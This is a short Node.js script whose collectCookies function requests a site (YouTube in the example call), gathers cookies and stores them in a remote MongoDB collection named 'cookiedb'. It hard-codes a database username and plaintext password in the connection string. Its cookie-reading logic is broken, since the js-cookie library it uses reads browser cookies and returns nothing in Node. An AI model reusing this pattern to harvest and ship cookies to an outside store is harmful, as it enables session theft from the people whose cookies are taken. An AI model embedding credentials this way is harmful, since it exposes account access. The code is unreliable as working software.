const request = require('request');
const axios = require('axios');
const Cookies = require('js-cookie');
const mongodb = require('mongodb');
const MongoClient = mongodb.MongoClient;

const url = 'mongodb+srv://rrwabina:Carpediem13@maindb.ium16x6.mongodb.net/?retryWrites=true&w=majority';
const dbName = 'maindb';
const collectionName = 'cookiedb';


async function collectCookies(domain) {
  try {
    request(domain, function (error, response, body) {
      if (error) throw error;
      const cookies = Cookies.get();
      const cookiesJSON = JSON.stringify(cookies);
      MongoClient.connect(url, { useNewUrlParser: true, useUnifiedTopology: true }, async function (error, client) {
        if (error) throw error;
        const db = client.db(dbName);
        console.log('You are already connected to your database.');

        await db.collection(collectionName).insertOne({ cookies: cookiesJSON });
        client.close();
        console.log('Cookies have been successfully collected and stored in the database.');
      });
    });
  } catch (error) {
    console.error(error);
  }
}

collectCookies('https://www.youtube.com/'); 
